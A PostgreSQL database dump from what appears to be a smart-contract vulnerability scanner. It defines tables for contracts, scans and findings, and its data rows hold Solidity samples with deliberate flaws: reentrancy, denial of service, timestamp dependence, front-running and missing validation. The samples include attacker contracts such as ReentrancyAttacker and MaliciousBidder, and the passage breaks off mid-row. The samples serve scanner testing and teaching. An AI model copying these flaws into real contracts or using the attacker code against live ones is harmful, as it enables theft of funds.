--
-- PostgreSQL database dump
--

-- Dumped from database version 15.4
-- Dumped by pg_dump version 15.4

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: contract_language; Type: TYPE; Schema: public; Owner: postgres
--

CREATE TYPE public.contract_language AS ENUM (
    'solidity',
    'vyper',
    'rust',
    'move',
    'cairo'
);


ALTER TYPE public.contract_language OWNER TO postgres;

--
-- Name: contract_status; Type: TYPE; Schema: public; Owner: postgres
--

CREATE TYPE public.contract_status AS ENUM (
    'uploaded',
    'pending',
    'scanning',
    'scanned',
    'failed'
);


ALTER TYPE public.contract_status OWNER TO postgres;

--
-- Name: scan_status; Type: TYPE; Schema: public; Owner: postgres
--

CREATE TYPE public.scan_status AS ENUM (
    'queued',
    'running',
    'completed',
    'failed'
);


ALTER TYPE public.scan_status OWNER TO postgres;

--
-- Name: vulnerability_severity; Type: TYPE; Schema: public; Owner: postgres
--

CREATE TYPE public.vulnerability_severity AS ENUM (
    'critical',
    'high',
    'medium',
    'low'
);


ALTER TYPE public.vulnerability_severity OWNER TO postgres;

--
-- Name: vulnerability_status; Type: TYPE; Schema: public; Owner: postgres
--

CREATE TYPE public.vulnerability_status AS ENUM (
    'open',
    'acknowledged',
    'fixed',
    'false_positive'
);


ALTER TYPE public.vulnerability_status OWNER TO postgres;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: alembic_version; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.alembic_version (
    version_num character varying(32) NOT NULL
);


ALTER TABLE public.alembic_version OWNER TO postgres;

--
-- Name: contract_files; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.contract_files (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    contract_id uuid NOT NULL,
    file_path character varying(500) NOT NULL,
    file_content text NOT NULL,
    is_main_file boolean DEFAULT false NOT NULL,
    file_size integer NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.contract_files OWNER TO postgres;

--
-- Name: contracts; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.contracts (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    user_id uuid NOT NULL,
    name character varying(255) NOT NULL,
    address character varying(42),
    network character varying(50) NOT NULL,
    source_code text,
    bytecode text,
    lines_of_code integer NOT NULL,
    is_multi_file boolean DEFAULT false NOT NULL,
    main_file_path character varying(500),
    file_count integer DEFAULT 1 NOT NULL,
    total_lines_of_code integer DEFAULT 0 NOT NULL,
    language public.contract_language NOT NULL,
    compiler_version character varying(50),
    language_metadata jsonb,
    status public.contract_status NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.contracts OWNER TO postgres;

--
-- Name: project_contracts; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.project_contracts (
    project_id uuid NOT NULL,
    contract_id uuid NOT NULL,
    added_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.project_contracts OWNER TO postgres;

--
-- Name: projects; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.projects (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    name character varying(255) NOT NULL,
    description text,
    user_id uuid NOT NULL,
    settings jsonb DEFAULT '{}'::jsonb NOT NULL,
    default_scan_profile character varying(50) DEFAULT 'standard'::character varying NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.projects OWNER TO postgres;

--
-- Name: saved_searches; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.saved_searches (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    user_id uuid NOT NULL,
    name character varying(255) NOT NULL,
    description text,
    search_params jsonb NOT NULL,
    last_executed_at timestamp with time zone,
    execution_count integer DEFAULT 0 NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.saved_searches OWNER TO postgres;

--
-- Name: TABLE saved_searches; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON TABLE public.saved_searches IS 'User-saved search queries for quick re-execution';


--
-- Name: COLUMN saved_searches.search_params; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON COLUMN public.saved_searches.search_params IS 'JSON object containing SearchRequest parameters';


--
-- Name: scans; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.scans (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    contract_id uuid NOT NULL,
    user_id uuid NOT NULL,
    scan_type character varying(50) NOT NULL,
    status public.scan_status NOT NULL,
    started_at timestamp with time zone,
    completed_at timestamp with time zone,
    error_message text,
    critical_count integer NOT NULL,
    high_count integer NOT NULL,
    medium_count integer NOT NULL,
    low_count integer NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL,
    scanners_used character varying(50)[],
    scan_config jsonb DEFAULT '{}'::jsonb,
    duration_seconds integer
);


ALTER TABLE public.scans OWNER TO postgres;

--
-- Name: COLUMN scans.scanners_used; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON COLUMN public.scans.scanners_used IS 'Array of scanner IDs used in this scan (e.g., {slither, mythril})';


--
-- Name: COLUMN scans.scan_config; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON COLUMN public.scans.scan_config IS 'Scanner configuration and parameters used for this scan';


--
-- Name: COLUMN scans.duration_seconds; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON COLUMN public.scans.duration_seconds IS 'Scan duration in seconds (completed_at - started_at)';


--
-- Name: sessions; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.sessions (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    user_id uuid NOT NULL,
    token character varying(500) NOT NULL,
    refresh_token character varying(500),
    expires_at timestamp with time zone NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    is_revoked boolean DEFAULT false NOT NULL
);


ALTER TABLE public.sessions OWNER TO postgres;

--
-- Name: user_preferences; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.user_preferences (
    user_id uuid NOT NULL,
    email_notifications boolean DEFAULT true NOT NULL,
    scan_completion_notifications boolean DEFAULT true NOT NULL,
    critical_vulnerability_alerts boolean DEFAULT true NOT NULL,
    weekly_digest boolean DEFAULT false NOT NULL,
    theme character varying(20) DEFAULT 'light'::character varying NOT NULL,
    timezone character varying(50) DEFAULT 'UTC'::character varying NOT NULL,
    language character varying(10) DEFAULT 'en'::character varying NOT NULL,
    preferences jsonb DEFAULT '{}'::jsonb,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.user_preferences OWNER TO postgres;

--
-- Name: TABLE user_preferences; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON TABLE public.user_preferences IS 'User-specific settings and preferences';


--
-- Name: COLUMN user_preferences.preferences; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON COLUMN public.user_preferences.preferences IS 'Additional user preferences as JSON';


--
-- Name: users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.users (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    email character varying(255) NOT NULL,
    hashed_password character varying(255) NOT NULL,
    is_active boolean DEFAULT true NOT NULL,
    is_superuser boolean DEFAULT false NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.users OWNER TO postgres;

--
-- Name: vulnerabilities; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.vulnerabilities (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    scan_id uuid NOT NULL,
    contract_id uuid NOT NULL,
    title character varying(255) NOT NULL,
    description text NOT NULL,
    severity public.vulnerability_severity NOT NULL,
    status public.vulnerability_status NOT NULL,
    swc_id character varying(20),
    line_number integer,
    code_snippet text,
    recommendation text,
    detected_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL,
    scanner_id character varying(50),
    category character varying(100),
    confidence numeric(3,2)
);


ALTER TABLE public.vulnerabilities OWNER TO postgres;

--
-- Name: COLUMN vulnerabilities.scanner_id; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON COLUMN public.vulnerabilities.scanner_id IS 'Scanner tool that detected this vulnerability (e.g., slither, mythril, aderyn)';


--
-- Name: COLUMN vulnerabilities.category; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON COLUMN public.vulnerabilities.category IS 'Vulnerability type category (e.g., reentrancy, access_control, arithmetic)';


--
-- Name: COLUMN vulnerabilities.confidence; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON COLUMN public.vulnerabilities.confidence IS 'Scanner confidence score (0.0 to 1.0, where 1.0 is highest confidence)';


--
-- Data for Name: alembic_version; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.alembic_version (version_num) FROM stdin;
08bf8921767b
\.


--
-- Data for Name: contract_files; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.contract_files (id, contract_id, file_path, file_content, is_main_file, file_size, created_at) FROM stdin;
\.


--
-- Data for Name: contracts; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.contracts (id, user_id, name, address, network, source_code, bytecode, lines_of_code, is_multi_file, main_file_path, file_count, total_lines_of_code, language, compiler_version, language_metadata, status, created_at, updated_at) FROM stdin;
86f9a16f-7896-4115-b321-adf9db382682	ab45210a-44a1-490e-bd5f-18135cdc3c91	ReEntrancy Contract	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Reentrancy Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract is vulnerable to reentrancy attacks.\n * An attacker can recursively call withdraw() before the balance is updated.\n */\ncontract VulnerableBank {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // VULNERABLE: State update happens after external call\n    function withdraw() public {\n        uint256 amount = balances[msg.sender];\n        require(amount > 0, "Insufficient balance");\n\n        // VULNERABILITY: External call before state update\n        (bool success, ) = msg.sender.call{value: amount}("");\n        require(success, "Transfer failed");\n\n        // State update happens too late\n        balances[msg.sender] = 0;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n/**\n * @title Reentrancy Attacker\n * @dev Example attacker contract that exploits the reentrancy vulnerability\n */\ncontract ReentrancyAttacker {\n    VulnerableBank public vulnerableBank;\n    uint256 public attackCount;\n\n    constructor(address _vulnerableBankAddress) {\n        vulnerableBank = VulnerableBank(_vulnerableBankAddress);\n    }\n\n    function attack() public payable {\n        require(msg.value >= 1 ether, "Need at least 1 ether to attack");\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw();\n    }\n\n    // Fallback function that re-enters the withdraw function\n    receive() external payable {\n        if (address(vulnerableBank).balance >= 1 ether && attackCount < 5) {\n            attackCount++;\n            vulnerableBank.withdraw();\n        }\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n	\N	65	f	\N	1	0	solidity	\N	\N	scanned	2025-10-16 21:57:40.548351+00	2025-10-16 22:15:51.755661+00
af250661-1a6a-4989-985b-7e73b6e8f306	27850871-1cd4-4804-9c1d-6cf8fb90fbd2	TestPDFContract	\N	ethereum	pragma solidity ^0.8.0;\n\ncontract Test {\n    function test() public {\n        // test\n    }\n}	\N	7	f	\N	1	0	solidity	\N	null	scanned	2025-10-17 14:51:40.447323+00	2025-10-17 14:52:06.322439+00
fc783138-6c5a-4dce-b469-9fdf46020f14	ab45210a-44a1-490e-bd5f-18135cdc3c91	Denial of Service	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Denial of Service Vulnerability Examples\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract demonstrates various DoS attack vectors.\n */\ncontract VulnerableAuction {\n    address public currentLeader;\n    uint256 public currentBid;\n\n    // VULNERABLE: DoS by refusing payment\n    function bid() public payable {\n        require(msg.value > currentBid, "Bid too low");\n\n        // VULNERABILITY: Refund can fail, blocking new bids\n        if (currentLeader != address(0)) {\n            payable(currentLeader).transfer(currentBid);\n        }\n\n        currentLeader = msg.sender;\n        currentBid = msg.value;\n    }\n}\n\n/**\n * @title DoS by Gas Limit\n * @dev Shows unbounded loop vulnerability\n */\ncontract VulnerableDistributor {\n    address[] public shareholders;\n    mapping(address => uint256) public shares;\n\n    function addShareholder(address _shareholder, uint256 _shares) public {\n        shareholders.push(_shareholder);\n        shares[_shareholder] = _shares;\n    }\n\n    // VULNERABLE: Unbounded loop can exceed gas limit\n    function distributeRewards() public payable {\n        uint256 totalShares = 0;\n\n        // VULNERABILITY: As shareholders array grows, this can exceed gas limit\n        for (uint256 i = 0; i < shareholders.length; i++) {\n            totalShares += shares[shareholders[i]];\n        }\n\n        for (uint256 i = 0; i < shareholders.length; i++) {\n            uint256 reward = (msg.value * shares[shareholders[i]]) / totalShares;\n            payable(shareholders[i]).transfer(reward);\n        }\n    }\n}\n\n/**\n * @title DoS by Block Gas Limit\n * @dev Shows vulnerability with array operations\n */\ncontract VulnerableRegistry {\n    address[] public users;\n    mapping(address => bool) public registered;\n\n    function register() public {\n        require(!registered[msg.sender], "Already registered");\n        users.push(msg.sender);\n        registered[msg.sender] = true;\n    }\n\n    // VULNERABLE: Deleting large arrays consumes massive gas\n    function reset() public {\n        // VULNERABILITY: Can exceed block gas limit with large arrays\n        for (uint256 i = 0; i < users.length; i++) {\n            registered[users[i]] = false;\n        }\n        delete users;\n    }\n\n    // VULNERABLE: Unbounded iteration\n    function getUserCount() public view returns (uint256) {\n        uint256 count = 0;\n        // VULNERABILITY: Reading entire array can exceed gas limit\n        for (uint256 i = 0; i < users.length; i++) {\n            if (registered[users[i]]) {\n                count++;\n            }\n        }\n        return count;\n    }\n}\n\n/**\n * @title DoS by External Contract\n * @dev Shows vulnerability from calling malicious contracts\n */\ncontract VulnerablePaymentSplitter {\n    address[] public recipients;\n\n    function addRecipient(address _recipient) public {\n        recipients.push(_recipient);\n    }\n\n    // VULNERABLE: One malicious recipient can block all payments\n    function splitPayment() public payable {\n        uint256 share = msg.value / recipients.length;\n\n        // VULNERABILITY: If any recipient reverts, all payments fail\n        for (uint256 i = 0; i < recipients.length; i++) {\n            payable(recipients[i]).transfer(share);\n        }\n    }\n}\n\n/**\n * @title Malicious Recipient for DoS Attack\n * @dev Contract that rejects payments to cause DoS\n */\ncontract MaliciousBidder {\n    VulnerableAuction public auction;\n\n    constructor(address _auctionAddress) {\n        auction = VulnerableAuction(_auctionAddress);\n    }\n\n    function attack() public payable {\n        auction.bid{value: msg.value}();\n    }\n\n    // Reject all payments - this prevents anyone else from bidding\n    receive() external payable {\n        revert("I will never give up my lead!");\n    }\n}\n	\N	134	f	\N	1	0	solidity	\N	\N	scanned	2025-10-16 23:33:46.167994+00	2025-10-17 18:21:41.482781+00
98593981-74f4-43f4-b7f6-3d795f4a488c	ab45210a-44a1-490e-bd5f-18135cdc3c91	Timestamp Dep	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Timestamp Dependence Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract uses block.timestamp for critical logic, which can be manipulated\n * by miners within a ~15 second window.\n */\ncontract VulnerableLottery {\n    address public owner;\n    uint256 public lotteryEndTime;\n    address[] public players;\n    uint256 public ticketPrice = 0.1 ether;\n\n    constructor(uint256 _duration) {\n        owner = msg.sender;\n        lotteryEndTime = block.timestamp + _duration;\n    }\n\n    function buyTicket() public payable {\n        require(msg.value == ticketPrice, "Incorrect ticket price");\n        require(block.timestamp < lotteryEndTime, "Lottery ended");\n        players.push(msg.sender);\n    }\n\n    // VULNERABLE: Uses block.timestamp for random number generation\n    function drawWinner() public {\n        require(block.timestamp >= lotteryEndTime, "Lottery not ended yet");\n        require(players.length > 0, "No players");\n\n        // VULNERABILITY: Miners can manipulate block.timestamp\n        uint256 randomIndex = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % players.length;\n        address winner = players[randomIndex];\n\n        payable(winner).transfer(address(this).balance);\n        delete players;\n        lotteryEndTime = block.timestamp + 1 days;\n    }\n}\n\n/**\n * @title Time-Based Access Control Vulnerability\n * @dev Shows timestamp manipulation for access control\n */\ncontract VulnerableTimelock {\n    mapping(address => uint256) public lockTime;\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        // Lock for 1 week\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    // VULNERABLE: Relies on block.timestamp for security\n    function withdraw() public {\n        require(balances[msg.sender] > 0, "No balance");\n        // VULNERABILITY: Miner can manipulate timestamp by ~15 seconds\n        require(block.timestamp >= lockTime[msg.sender], "Funds locked");\n\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        payable(msg.sender).transfer(amount);\n    }\n\n    // VULNERABLE: Time-based access control\n    function emergencyWithdraw() public {\n        // VULNERABILITY: Attacker miner can manipulate timing\n        require(block.timestamp % 2 == 0, "Can only withdraw on even seconds");\n        payable(msg.sender).transfer(balances[msg.sender]);\n        balances[msg.sender] = 0;\n    }\n}\n\n/**\n * @title Randomness from Block Variables\n * @dev Shows vulnerability in using block variables for randomness\n */\ncontract VulnerableRandomness {\n    uint256 public lastWinningNumber;\n\n    // VULNERABLE: Predictable random number generation\n    function generateRandomNumber() public returns (uint256) {\n        // VULNERABILITY: All block variables are known/predictable\n        uint256 random = uint256(keccak256(abi.encodePacked(\n            block.timestamp,\n            block.difficulty,\n            block.number,\n            msg.sender\n        ))) % 100;\n\n        lastWinningNumber = random;\n        return random;\n    }\n\n    function playGame() public payable returns (bool) {\n        require(msg.value == 0.01 ether, "Must bet 0.01 ether");\n\n        uint256 winningNumber = generateRandomNumber();\n\n        // If number is > 50, player wins\n        if (winningNumber > 50) {\n            payable(msg.sender).transfer(0.02 ether);\n            return true;\n        }\n        return false;\n    }\n\n    receive() external payable {}\n}\n	\N	112	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-17 19:10:26.483499+00	2025-10-17 19:10:39.241762+00
43195d13-0923-4e91-9008-cb6ccd854b66	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	ReEntrancy Contract	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Reentrancy Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract is vulnerable to reentrancy attacks.\n * An attacker can recursively call withdraw() before the balance is updated.\n */\ncontract VulnerableBank {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // VULNERABLE: State update happens after external call\n    function withdraw() public {\n        uint256 amount = balances[msg.sender];\n        require(amount > 0, "Insufficient balance");\n\n        // VULNERABILITY: External call before state update\n        (bool success, ) = msg.sender.call{value: amount}("");\n        require(success, "Transfer failed");\n\n        // State update happens too late\n        balances[msg.sender] = 0;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n/**\n * @title Reentrancy Attacker\n * @dev Example attacker contract that exploits the reentrancy vulnerability\n */\ncontract ReentrancyAttacker {\n    VulnerableBank public vulnerableBank;\n    uint256 public attackCount;\n\n    constructor(address _vulnerableBankAddress) {\n        vulnerableBank = VulnerableBank(_vulnerableBankAddress);\n    }\n\n    function attack() public payable {\n        require(msg.value >= 1 ether, "Need at least 1 ether to attack");\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw();\n    }\n\n    // Fallback function that re-enters the withdraw function\n    receive() external payable {\n        if (address(vulnerableBank).balance >= 1 ether && attackCount < 5) {\n            attackCount++;\n            vulnerableBank.withdraw();\n        }\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n	\N	65	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-17 21:14:17.340604+00	2025-10-17 21:15:16.150978+00
4557d54f-bc37-4e82-819f-32a9a5137315	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	Front Running	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Front-Running Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract is vulnerable to front-running attacks where attackers\n * can see pending transactions and submit their own with higher gas fees.\n */\ncontract VulnerablePuzzle {\n    bytes32 public solutionHash;\n    uint256 public reward = 10 ether;\n    address public owner;\n    bool public solved;\n\n    constructor(bytes32 _solutionHash) payable {\n        solutionHash = _solutionHash;\n        owner = msg.sender;\n    }\n\n    // VULNERABLE: Solution is visible in mempool before confirmation\n    function submitSolution(string memory _solution) public {\n        require(!solved, "Already solved");\n\n        // VULNERABILITY: Anyone can see the solution in the mempool and front-run it\n        require(keccak256(abi.encodePacked(_solution)) == solutionHash, "Incorrect solution");\n\n        solved = true;\n        payable(msg.sender).transfer(reward);\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title Front-Running in DEX\n * @dev Shows front-running vulnerability in token swaps\n */\ncontract VulnerableDEX {\n    mapping(address => uint256) public tokenABalance;\n    mapping(address => uint256) public tokenBBalance;\n    uint256 public tokenAReserve = 1000 ether;\n    uint256 public tokenBReserve = 1000 ether;\n\n    // Simplified constant product AMM\n    function getSwapAmount(uint256 _tokenAAmount) public view returns (uint256) {\n        // x * y = k\n        uint256 k = tokenAReserve * tokenBReserve;\n        uint256 newTokenAReserve = tokenAReserve + _tokenAAmount;\n        uint256 newTokenBReserve = k / newTokenAReserve;\n        return tokenBReserve - newTokenBReserve;\n    }\n\n    // VULNERABLE: Transaction ordering dependency\n    function swapAforB(uint256 _tokenAAmount, uint256 _minTokenBAmount) public {\n        uint256 tokenBAmount = getSwapAmount(_tokenAAmount);\n\n        // VULNERABILITY: Front-runner can see this transaction and swap before it,\n        // causing the price to move and potentially causing this transaction to fail\n        // or execute at a worse rate\n        require(tokenBAmount >= _minTokenBAmount, "Slippage too high");\n\n        tokenABalance[msg.sender] -= _tokenAAmount;\n        tokenBBalance[msg.sender] += tokenBAmount;\n\n        tokenAReserve += _tokenAAmount;\n        tokenBReserve -= tokenBAmount;\n    }\n\n    function deposit(uint256 _tokenA, uint256 _tokenB) public {\n        tokenABalance[msg.sender] += _tokenA;\n        tokenBBalance[msg.sender] += _tokenB;\n    }\n}\n\n/**\n * @title Transaction Ordering Dependence\n * @dev Shows vulnerability where transaction order affects outcome\n */\ncontract VulnerableICO {\n    uint256 public price = 1 ether;\n    uint256 public tokensAvailable = 1000;\n    mapping(address => uint256) public balances;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // VULNERABLE: Price can be front-run\n    function updatePrice(uint256 _newPrice) public {\n        require(msg.sender == owner, "Not owner");\n        // VULNERABILITY: Users buying tokens can be front-run by owner increasing price\n        price = _newPrice;\n    }\n\n    function buyTokens(uint256 _amount) public payable {\n        require(tokensAvailable >= _amount, "Not enough tokens");\n        // VULNERABILITY: Price might change between when user submits transaction\n        // and when it's mined\n        require(msg.value >= price * _amount, "Insufficient payment");\n\n        tokensAvailable -= _amount;\n        balances[msg.sender] += _amount;\n    }\n}\n\n/**\n * @title ERC20 Approval Front-Running\n * @dev Shows approve/transferFrom race condition\n */\ncontract VulnerableERC20 {\n    mapping(address => uint256) public balances;\n    mapping(address => mapping(address => uint256)) public allowances;\n\n    string public name = "Vulnerable Token";\n    string public symbol = "VULN";\n\n    constructor(uint256 _initialSupply) {\n        balances[msg.sender] = _initialSupply;\n    }\n\n    // VULNERABLE: Changing allowance can be front-run\n    function approve(address _spender, uint256 _amount) public returns (bool) {\n        // VULNERABILITY: If user tries to change allowance from N to M,\n        // spender can front-run by:\n        // 1. transferFrom N tokens (old allowance)\n        // 2. Let approve transaction execute\n        // 3. transferFrom M tokens (new allowance)\n        // Result: spender transferred N+M tokens instead of M\n        allowances[msg.sender][_spender] = _amount;\n        return true;\n    }\n\n    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool) {\n        require(balances[_from] >= _amount, "Insufficient balance");\n        require(allowances[_from][msg.sender] >= _amount, "Insufficient allowance");\n\n        balances[_from] -= _amount;\n        balances[_to] += _amount;\n        allowances[_from][msg.sender] -= _amount;\n\n        return true;\n    }\n}\n	\N	146	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-10-17 21:31:19.196765+00	2025-10-17 21:31:34.262851+00
e29b1d07-26aa-4f45-bee2-83040bf5745e	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	Short Address	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Short Address Attack Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This vulnerability occurs when an ERC20 token contract doesn't validate\n * the length of the address parameter, allowing attackers to manipulate\n * the amount by sending a shorter address.\n *\n * Note: This is primarily a client-side vulnerability but contracts should\n * implement proper validation.\n */\ncontract VulnerableToken {\n    mapping(address => uint256) public balances;\n    string public name = "Vulnerable Token";\n    string public symbol = "VULN";\n    uint8 public decimals = 18;\n    uint256 public totalSupply;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor(uint256 _initialSupply) {\n        totalSupply = _initialSupply;\n        balances[msg.sender] = _initialSupply;\n    }\n\n    // VULNERABLE: No length validation on address parameters\n    function transfer(address _to, uint256 _value) public returns (bool) {\n        // VULNERABILITY: If _to address is short (missing trailing zeros),\n        // the EVM will pad it, and _value might get shifted\n        require(balances[msg.sender] >= _value, "Insufficient balance");\n\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    // VULNERABLE: Batch transfer without proper validation\n    function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {\n        // VULNERABILITY: No validation on address array length\n        uint256 count = _receivers.length;\n        uint256 amount = _value * count;\n\n        require(balances[msg.sender] >= amount, "Insufficient balance");\n\n        balances[msg.sender] -= amount;\n\n        for (uint256 i = 0; i < count; i++) {\n            balances[_receivers[i]] += _value;\n            emit Transfer(msg.sender, _receivers[i], _value);\n        }\n\n        return true;\n    }\n}\n\n/**\n * @title Missing Input Validation\n * @dev Shows various input validation vulnerabilities\n */\ncontract VulnerableExchange {\n    mapping(address => mapping(address => uint256)) public tokens;\n\n    // VULNERABLE: No zero address check\n    function deposit(address _token, uint256 _amount) public {\n        // VULNERABILITY: Doesn't check for zero address\n        require(_amount > 0, "Amount must be positive");\n        tokens[_token][msg.sender] += _amount;\n    }\n\n    // VULNERABLE: No validation on addresses\n    function withdraw(address _token, uint256 _amount) public {\n        // VULNERABILITY: No address validation\n        require(tokens[_token][msg.sender] >= _amount, "Insufficient balance");\n        tokens[_token][msg.sender] -= _amount;\n    }\n\n    // VULNERABLE: Missing array length check\n    function batchDeposit(\n        address[] memory _tokens,\n        uint256[] memory _amounts\n    ) public {\n        // VULNERABILITY: Assumes arrays have same length\n        for (uint256 i = 0; i < _tokens.length; i++) {\n            tokens[_tokens[i]][msg.sender] += _amounts[i];\n        }\n    }\n\n    // VULNERABLE: No validation on transfer parameters\n    function transferBetweenUsers(\n        address _token,\n        address _from,\n        address _to,\n        uint256 _amount\n    ) public {\n        // VULNERABILITY: No checks on addresses (zero address, same address, etc.)\n        require(tokens[_token][_from] >= _amount, "Insufficient balance");\n        tokens[_token][_from] -= _amount;\n        tokens[_token][_to] += _amount;\n    }\n}\n\n/**\n * @title Missing Data Length Validation\n * @dev Shows vulnerability in handling dynamic data\n */\ncontract VulnerableMultisig {\n    address[] public owners;\n    mapping(bytes32 => bool) public executed;\n\n    constructor(address[] memory _owners) {\n        // VULNERABLE: No validation on array length or addresses\n        owners = _owners;\n    }\n\n    // VULNERABLE: No validation on data length\n    function execute(\n        address _target,\n        bytes memory _data,\n        bytes[] memory _signatures\n    ) public {\n        bytes32 txHash = keccak256(abi.encodePacked(_target, _data));\n        require(!executed[txHash], "Already executed");\n\n        // VULNERABILITY: No validation on signatures array length\n        // VULNERABILITY: No validation that signatures is not empty\n        require(_signatures.length >= owners.length / 2 + 1, "Not enough signatures");\n\n        // Simplified signature verification (also vulnerable)\n        executed[txHash] = true;\n\n        (bool success, ) = _target.call(_data);\n        require(success, "Execution failed");\n    }\n}\n\n/**\n * @title Parameter Validation Bypass\n * @dev Shows how missing parameter validation can be exploited\n */\ncontract VulnerableAirdrop {\n    mapping(address => uint256) public claimed;\n    address public token;\n\n    constructor(address _token) {\n        token = _token;\n    }\n\n    // VULNERABLE: No validation on parameters\n    function claimTokens(address _recipient, uint256 _amount) public {\n        // VULNERABILITY: No check that _recipient is not zero address\n        // VULNERABILITY: No check that _amount is reasonable\n        // VULNERABILITY: No check that caller hasn't claimed before\n\n        require(claimed[_recipient] == 0, "Already claimed");\n        claimed[_recipient] = _amount;\n\n        // Simplified token transfer\n        